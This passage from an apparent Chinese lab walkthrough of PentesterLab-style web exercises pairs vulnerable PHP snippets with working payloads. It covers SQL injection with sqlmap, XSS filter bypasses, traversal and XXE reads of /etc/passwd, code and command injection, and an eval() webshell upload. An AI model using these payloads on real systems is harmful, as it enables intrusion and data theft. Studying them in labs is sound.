<h3 id="Example-5"><a href="#Example-5" class="headerlink" title="Example 5"></a>Example 5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (!preg_match(&apos;/^[0-9]+/&apos;, $_GET[&quot;id&quot;])) &#123; die(&quot;ERROR INTEGER REQUIRED&quot;); &#125;</div></pre></td></tr></table></figure>
<p>与前面类似，以一个数字开头的，后面可添加构造的sql语句进行攻击测试</p>
<h4 id="Payload-3"><a href="#Payload-3" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example4.php?id=2 or 1=1</div><div class="line">http://192.168.1.105/sqli/example4.php?id=2 union select 1,name, passwd,4,5 from users</div></pre></td></tr></table></figure>
<h4 id="SQLMAP-4"><a href="#SQLMAP-4" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example5.php?id=2 --dbs</div></pre></td></tr></table></figure>
<h3 id="Example-6"><a href="#Example-6" class="headerlink" title="Example 6"></a>Example 6</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (!preg_match(&apos;/[0-9]+$/&apos;, $_GET[&quot;id&quot;])) &#123; die(&quot;ERROR INTEGER REQUIRED&quot;); &#125;</div></pre></td></tr></table></figure>
<p>正则表达式值确保了参数id是以一个数字结尾的.他不能确保id参数的开头是合法的.</p>
<p>你可以变通一下前面说到的检测方法.你只需要在你的payload后面加上数字.比如你可以这样:1 or 1=1 # 123</p>
<h4 id="Payload-4"><a href="#Payload-4" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.105/sqli/example6.php?id=2 or 1=1-- - 1</div><div class="line">http://192.168.1.105/sqli/example6.php?id=2 or 1=1# 1</div><div class="line">http://192.168.1.105/sqli/example6.php?id=2 union select 1,name,passwd,4,5 from users-- - 123</div></pre></td></tr></table></figure>
<h4 id="SQLMAP-5"><a href="#SQLMAP-5" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.105/sqli/example6.php?id=2 --dbs</div></pre></td></tr></table></figure>
<h3 id="Example-7"><a href="#Example-7" class="headerlink" title="Example 7"></a>Example 7</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if (!preg_match(&apos;/^-?[0-9]+$/m&apos;, $_GET[&quot;id&quot;])) &#123; die(&quot;ERROR INTEGER REQUIRED&quot;); &#125;</div></pre></td></tr></table></figure>
<p>正则表达式将检查开始和结束的字符串是一个数字。然而，正则表达式中有一个修饰符/m。它只检查一行，不关心下一行有开始还是结束用数字。所以我们可以绕过它采用id =2\npayload。我们需要把\n转换成十六进制。就是%a0</p>
<h4 id="Payload-5"><a href="#Payload-5" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.110/sqli/example7.php?id=2%0aunion%0aselect%0a1,name,passwd,4,5%0afrom%0ausers%23</div></pre></td></tr></table></figure>
<h4 id="SQLMAP-6"><a href="#SQLMAP-6" class="headerlink" title="SQLMAP"></a>SQLMAP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://192.168.1.110/sqli/example7.php?id=2%0a</div></pre></td></tr></table></figure>
<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="Example-1-1"><a href="#Example-1-1" class="headerlink" title="Example 1"></a>Example 1</h3><p>没有做任何过滤</p>
<h4 id="Payload-6"><a href="#Payload-6" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
<h3 id="Example-2-1"><a href="#Example-2-1" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">preg_replace(&quot;/&lt;script&gt;/&quot;,&quot;&quot;,$name);</div><div class="line">preg_replace(&quot;/&lt;\/script&gt;/&quot;,&quot;&quot;,$name);</div></pre></td></tr></table></figure>
<p>过滤script标签，利用大写绕过</p>
<h4 id="Payload-7"><a href="#Payload-7" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
<h3 id="Example-3-1"><a href="#Example-3-1" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">preg_replace(&quot;/&lt;script&gt;/i&quot;,&quot;&quot;,$name);</div><div class="line">preg_replace(&quot;/&lt;\/script&gt;/i&quot;,&quot;&quot;,$name);</div></pre></td></tr></table></figure>
<p>过滤script标签，且使用模式修正符i，忽略大小写。</p>
<h4 id="Payload-8"><a href="#Payload-8" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/sc&lt;/script&gt;ript&gt;</div></pre></td></tr></table></figure>
<h3 id="Example-4-1"><a href="#Example-4-1" class="headerlink" title="Example 4"></a>Example 4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/script/i&apos;,$_GET[&quot;name&quot;])</div></pre></td></tr></table></figure>
<p>过滤script字符，且使用模式修正符i,忽略大小写。<br>利用img标签</p>
<h4 id="Payload-9"><a href="#Payload-9" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=1 onerror=alert(1)&gt;</div></pre></td></tr></table></figure>
<h3 id="Example-5-1"><a href="#Example-5-1" class="headerlink" title="Example 5"></a>Example 5</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_match(&apos;/alert/i&apos;,$_GET[&quot;name&quot;]))</div></pre></td></tr></table></figure>
<p>过滤alert字符，且使用模式修正符i,忽略大小写<br>利用prompt(),confirm(),String.fromCharCode()函数实现弹框</p>
<h4 id="Payload-10"><a href="#Payload-10" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;prompt(1);&lt;/script&gt;</div><div class="line">&lt;script&gt;confirm(1);&lt;/script&gt;</div><div class="line">&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))&lt;/script&gt;</div></pre></td></tr></table></figure>
<h3 id="Example-6-1"><a href="#Example-6-1" class="headerlink" title="Example 6"></a>Example 6</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	var $a=&quot;&lt;?php echo $_GET[&quot;name&quot;];?&gt;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>有源码可以看出，GET方式得到的参数直接发送到javascript代码中，所以在发送Payload的时候不需要添加script标签，只需要发送需要只执行的javascript代码即可。</p>
<h4 id="Payload-11"><a href="#Payload-11" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;;alert(1);//</div></pre></td></tr></table></figure>
<p>构成以下代码,实现弹窗<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	var $a= &quot;hacker&quot;;alert(1);//&quot;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p>
<h3 id="Example-7-1"><a href="#Example-7-1" class="headerlink" title="Example 7"></a>Example 7</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	var $a=&apos;&lt;?php echo htmlentities($_GET[&quot;name&quot;]);?&gt;&apos;;</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<p>使用htmlentities进行HTML编码，默认编码双引号</p>
<h4 id="Payload-12"><a href="#Payload-12" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos;;alert(1);//</div></pre></td></tr></table></figure>
<h3 id="Example-8"><a href="#Example-8" class="headerlink" title="Example 8"></a>Example 8</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if （isset($_POST[&quot;name&quot;]）)&#123;</div><div class="line">	echo &quot;HELLO &quot;.htmlentities($_POST[&quot;name&quot;])</div><div class="line">	&#125;</div><div class="line">?&gt;</div><div class="line">&lt;form action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;]; ?&gt;&quot; method=&quot;POST&quot;&gt;</div></pre></td></tr></table></figure>
<p>利用$_SERVER[‘PHP_SELF’]获取当前页面地址</p>
<p>假设该页面地址为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.110/xss/example8.php</div></pre></td></tr></table></figure></p>
<p>访问该页面，得到的表单 html 代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;form method=&quot;post&quot; action=&quot;/xss/example8.php&quot;&gt;</div></pre></td></tr></table></figure></p>
<h4 id="Payload-13"><a href="#Payload-13" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
<h3 id="Example-9"><a href="#Example-9" class="headerlink" title="Example 9"></a>Example 9</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">	document.write(location.hash.substring(1));</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure>
<h4 id="Payload-14"><a href="#Payload-14" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
<h2 id="Directory-traversal"><a href="#Directory-traversal" class="headerlink" title="Directory traversal"></a>Directory traversal</h2><h3 id="Example-1-2"><a href="#Example-1-2" class="headerlink" title="Example 1"></a>Example 1</h3><p>简单目录遍历</p>
<h4 id="Payload-15"><a href="#Payload-15" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.10/dirtrav/example1.php?file=../../../../../../../etc/passwd</div></pre></td></tr></table></figure>
<h3 id="Example-2-2"><a href="#Example-2-2" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if(!(strstr($file,&quot;/var/www/files/&quot;)))</div><div class="line">	die();</div></pre></td></tr></table></figure>
<p>检测是否包含/var/www/files/字符串</p>
<h4 id="Payload-16"><a href="#Payload-16" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.110/dirtrav/example2.php?file=/var/www/files/../../../../../../../etc/passwd</div></pre></td></tr></table></figure>
<h3 id="Example-3-2"><a href="#Example-3-2" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$path = preg_replace(&apos;/\x00.*/&apos;,&quot;&quot;,$path);</div></pre></td></tr></table></figure>
<p>使用%00截断后面字符串，读取passwd文件</p>
<h4 id="Payload-17"><a href="#Payload-17" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/dirtrav/example3.php?file=../../../../../../../etc/passwd%00</div></pre></td></tr></table></figure>
<h2 id="File-Include"><a href="#File-Include" class="headerlink" title="File Include"></a>File Include</h2><h3 id="Example-1-3"><a href="#Example-1-3" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">include($_GET[&quot;page&quot;]);</div></pre></td></tr></table></figure>
<h4 id="Payload-18"><a href="#Payload-18" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.110/fileincl/example2.php?page=intro.php</div></pre></td></tr></table></figure>
<p>读取intro.php文件</p>
<h3 id="Example-2-3"><a href="#Example-2-3" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$file = preg_replace(&apos;/\x00.*/&apos;,&quot;&quot;,$file);</div><div class="line">	include($file);</div></pre></td></tr></table></figure>
<p>使用%00截断后面字符串</p>
<h4 id="Payload-19"><a href="#Payload-19" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.110/fileincl/example2.php?page=intro.php%00</div></pre></td></tr></table></figure>
<h2 id="Code-injection"><a href="#Code-injection" class="headerlink" title="Code injection"></a>Code injection</h2><h3 id="Example-1-4"><a href="#Example-1-4" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php   </div><div class="line">  $str=&quot;echo \&quot;Hello &quot;.$_GET[&apos;name&apos;].&quot;!!!\&quot;;&quot;;  </div><div class="line">  </div><div class="line">  eval($str);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>使用了反斜杠【\】将echo后面的内容给转义了。这样做与加addslashes()函数进行过滤的意思是一样的<br>可以通过${${ }}这样的方式绕过，从而继续执行代码。</p>
<h4 id="Payload-20"><a href="#Payload-20" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/codeexec/example1.php?name=$&#123;$&#123;phpinfo()&#125;&#125;</div></pre></td></tr></table></figure>
<h3 id="Example-2-4"><a href="#Example-2-4" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">class User&#123;  </div><div class="line">  public $id, $name, $age;  </div><div class="line">  function __construct($id, $name, $age)&#123;  </div><div class="line">    $this-&gt;name= $name;  </div><div class="line">    $this-&gt;age = $age;  </div><div class="line">    $this-&gt;id = $id;  </div><div class="line">  &#125;     </div><div class="line">&#125;  </div><div class="line">  require_once(&apos;../header.php&apos;);  </div><div class="line">  require_once(&apos;../sqli/db.php&apos;);  </div><div class="line">    $sql = &quot;SELECT * FROM users &quot;;  </div><div class="line">  </div><div class="line">    $order = $_GET[&quot;order&quot;];  </div><div class="line">    $result = mysql_query($sql);  </div><div class="line">  if ($result) &#123;  </div><div class="line">        while ($row = mysql_fetch_assoc($result)) &#123;  </div><div class="line">      $users[] = new User($row[&apos;id&apos;],$row[&apos;name&apos;],$row[&apos;age&apos;]);  </div><div class="line">    &#125;  </div><div class="line">    if (isset($order))&lt;span style=&quot;color:#FF0000;&quot;&gt; &#123;   </div><div class="line">      usort($users, create_function(&apos;$a, $b&apos;, &apos;return strcmp($a-&gt;&apos;.$order.&apos;,$b-&gt;&apos;.$order.&apos;);&apos;));  </div><div class="line">    &#125;&lt;/span&gt;  </div><div class="line">    &#125;     </div><div class="line">  </div><div class="line">        ?&gt;  </div><div class="line">        &lt;table class=&apos;table table-striped&apos; &gt;  </div><div class="line">        &lt;tr&gt;  </div><div class="line">            &lt;th&gt;&lt;a href=&quot;example2.php?order=id&quot;&gt;id&lt;/th&gt;  </div><div class="line">            &lt;th&gt;&lt;a href=&quot;example2.php?order=name&quot;&gt;name&lt;/th&gt;  </div><div class="line">            &lt;th&gt;&lt;a href=&quot;example2.php?order=age&quot;&gt;age&lt;/th&gt;  </div><div class="line">        &lt;/tr&gt;  </div><div class="line">        &lt;?php  </div><div class="line">  </div><div class="line">    foreach ($users as $user) &#123;    </div><div class="line">            echo &quot;&lt;tr&gt;&quot;;  </div><div class="line">                echo &quot;&lt;td&gt;&quot;.$user-&gt;id.&quot;&lt;/td&gt;&quot;;  </div><div class="line">                echo &quot;&lt;td&gt;&quot;.$user-&gt;name.&quot;&lt;/td&gt;&quot;;  </div><div class="line">                echo &quot;&lt;td&gt;&quot;.$user-&gt;age.&quot;&lt;/td&gt;&quot;;  </div><div class="line">            echo &quot;&lt;/tr&gt;&quot;;  </div><div class="line">        &#125;     </div><div class="line">        echo &quot;&lt;/table&gt;&quot;;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>create_function()的不当使用造成代码注入，可以这样构造);}phpinfo();//<br>执行我们的命令，);}是闭合了前面的代码，而//则是将后面的内容注释掉</p>
<h4 id="Payload-21"><a href="#Payload-21" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/codeexec/example2.php?order=id);&#125;phpinfo();//</div></pre></td></tr></table></figure>
<h3 id="Example-3-3"><a href="#Example-3-3" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">    echo preg_replace($_GET[&quot;pattern&quot;], $_GET[&quot;new&quot;], $_GET[&quot;base&quot;]);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。<br>因此当满足了在语句的构造中有/e修正符，就有可能引起php代码注入的风险。可以如此构造new=phpinfo()&amp;pattern=/lamer/e&amp;base=Hello lamer</p>
<h4 id="Payload-22"><a href="#Payload-22" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/codeexec/example3.php?new=phpinfo()&amp;pattern=/lamer/e&amp;base=Hello lamer</div></pre></td></tr></table></figure>
<h3 id="Example-4-2"><a href="#Example-4-2" class="headerlink" title="Example 4"></a>Example 4</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">  // ensure name is not empty   </div><div class="line">  assert(trim(&quot;&apos;&quot;.$_GET[&apos;name&apos;].&quot;&apos;&quot;));  </div><div class="line">  echo &quot;Hello &quot;.htmlentities($_GET[&apos;name&apos;]);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>如此构造即可：hacker’.phpinfo().’</p>
<h4 id="Payload-23"><a href="#Payload-23" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/codeexec/example4.php?name=hacker&apos;.phpinfo().&apos;</div></pre></td></tr></table></figure>
<h2 id="Commands-injection"><a href="#Commands-injection" class="headerlink" title="Commands injection"></a>Commands injection</h2><h3 id="Example-1-5"><a href="#Example-1-5" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">  system(&quot;ping -c 2 &quot;.$_GET[&apos;ip&apos;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h4 id="Payload-24"><a href="#Payload-24" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1|id</div></pre></td></tr></table></figure>
<h3 id="Example-2-5"><a href="#Example-2-5" class="headerlink" title="Example 2"></a>Example 2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">  if (!(preg_match(&apos;/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/m&apos;, $_GET[&apos;ip&apos;]))) &#123;</div><div class="line">     die(&quot;Invalid IP address&quot;);</div><div class="line">  &#125;</div><div class="line">  system(&quot;ping -c 2 &quot;.$_GET[&apos;ip&apos;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>正则表达式中有一个修饰符/m。它只检查一行，不关心下一行,此时我们可以利用%0a（换行符）绕过</p>
<h4 id="Payload-25"><a href="#Payload-25" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.56.101/commandexec/example2.php?ip=127.0.0.1%0aid</div></pre></td></tr></table></figure>
<h3 id="Example-3-4"><a href="#Example-3-4" class="headerlink" title="Example 3"></a>Example 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">  if (!(preg_match(&apos;/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/&apos;, $_GET[&apos;ip&apos;]))) &#123;</div><div class="line">     header(&quot;Location: example3.php?ip=127.0.0.1&quot;);</div><div class="line">  &#125;</div><div class="line">  system(&quot;ping -c 2 &quot;.$_GET[&apos;ip&apos;]);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>利用Location重定向到example3.php?ip=127.0.0.1，这里可以是用curl、burpsuite和nc查看回显</p>
<h4 id="Payload-26"><a href="#Payload-26" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo -e &quot;GET /commandexec/example3.php?ip=127.0.0.1;id HTTP/1.1\r\nHost: 192.168.56.101\r\nConnection: close\r\n&quot; | nc 192.168.56.101 80</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl http://192.168.56.101/commandexec/example3.php?ip=127.0.0.1|ls</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/pentesterlab1.png" alt=""></p>
<h2 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h2><h3 id="Example-1-6"><a href="#Example-1-6" class="headerlink" title="Example 1"></a>Example 1</h3><p>直接上传一句话木马1.php。</p>
<h4 id="Payload-27"><a href="#Payload-27" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.php</div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/updata1.png" alt=""></p>
<h3 id="Example-2-6"><a href="#Example-2-6" class="headerlink" title="Example 2"></a>Example 2</h3><p>直接上传一句话木马1.php。失败。</p>
<p>把上传文件的文件名修改为1.php.aaaa<br>对于apache这样的服务器，碰到aaaa发现是不认识的文件名后缀，然后就会跳过这个文件名，解析下一个文件名。<br>成功上传</p>
<p>根据php版本也可以尝试.php3,.php4,.php5此类后缀名进行上传。</p>
<h4 id="Payload-28"><a href="#Payload-28" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.php.aaaaa</div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1.php3</div><div class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/updata2.png" alt=""></p>
<h2 id="XML-attacks"><a href="#XML-attacks" class="headerlink" title="XML attacks"></a>XML attacks</h2><h3 id="Example-1-7"><a href="#Example-1-7" class="headerlink" title="Example 1"></a>Example 1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">	$xml=simplexml_load_string($_GET[&apos;xml&apos;]);</div><div class="line">	print_r((string)$xml);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>直接读取/etc/passwd</p>
<h4 id="Payload-29"><a href="#Payload-29" class="headerlink" title="Payload"></a>Payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;</div></pre></td></tr></table></figure>
<p>Url编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://192.168.1.114/xml/example1.php?xml=%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2ftest%3E</div></pre></td></tr></table></figure>
